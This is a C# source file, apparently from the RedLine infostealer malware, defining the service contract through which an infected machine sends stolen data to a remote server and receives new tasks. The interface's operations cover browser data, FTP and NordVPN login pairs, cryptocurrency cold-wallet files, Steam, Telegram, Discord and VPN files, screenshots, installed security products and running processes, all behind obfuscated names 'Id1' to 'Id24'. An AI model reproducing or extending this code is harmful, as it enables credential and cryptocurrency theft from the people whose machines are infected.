using System.Collections.Generic;
using System.ServiceModel;
using System.Threading.Tasks;

namespace RedLine.SharedModels;

[ServiceContract(Name = "Entity", SessionMode = SessionMode.Required)]
public interface IRemoteEndpoint
{
	[OperationContract(Name = "Id1")]
	Task<bool> CheckConnect();

	[OperationContract(Name = "Id2")]
	Task<ClientSettings> GetArguments();

	[OperationContract(Name = "Id3")]
	Task VerifyScanRequest(UserLog user);

	[OperationContract(Name = "Id4")]
	Task<ApiResponse> Init(UserLog user);

	[OperationContract(Name = "Id5")]
	Task<ApiResponse> InitDisplay(byte[] display);

	[OperationContract(Name = "Id6")]
	Task<ApiResponse> PartDefenders(List<string> defenders);

	[OperationContract(Name = "Id7")]
	Task<ApiResponse> PartLanguages(List<string> languages);

	[OperationContract(Name = "Id8")]
	Task<ApiResponse> PartInstalledSoftwares(List<string> softwares);

	[OperationContract(Name = "Id9")]
	Task<ApiResponse> PartProcesses(List<string> processes);

	[OperationContract(Name = "Id10")]
	Task<ApiResponse> PartHardwares(List<Hardware> hardwares);

	[OperationContract(Name = "Id11")]
	Task<ApiResponse> PartBrowsers(List<Browser> browsers);

	[OperationContract(Name = "Id12")]
	Task<ApiResponse> PartFtpConnections(List<LoginPair> ftps);

	[OperationContract(Name = "Id13")]
	Task<ApiResponse> PartInstalledBrowsers(List<InstalledBrowserInfo> installedBrowsers);

	[OperationContract(Name = "Id14")]
	Task<ApiResponse> PartScannedFiles(List<RemoteFile> remoteFiles);

	[OperationContract(Name = "Id15")]
	Task<ApiResponse> PartColdWallets(List<RemoteFile> remoteFiles);

	[OperationContract(Name = "Id16")]
	Task<ApiResponse> PartSteamFiles(List<RemoteFile> remoteFiles);

	[OperationContract(Name = "Id17")]
	Task<ApiResponse> PartNordVPN(List<LoginPair> loginPairs);

	[OperationContract(Name = "Id18")]
	Task<ApiResponse> PartOpenVPN(List<RemoteFile> remoteFiles);

	[OperationContract(Name = "Id19")]
	Task<ApiResponse> PartProtonVPN(List<RemoteFile> remoteFiles);

	[OperationContract(Name = "Id20")]
	Task<ApiResponse> PartTelegramFiles(List<RemoteFile> remoteFiles);

	[OperationContract(Name = "Id21")]
	Task<ApiResponse> PartDiscord(List<RemoteFile> remoteFiles);

	[OperationContract(Name = "Id22")]
	Task Confirm();

	[OperationContract(Name = "Id23")]
	Task<IList<RemoteTask>> GetUpdates(UserLog user);

	[OperationContract(Name = "Id24")]
	Task VerifyUpdate(UserLog user, int updateId);
}
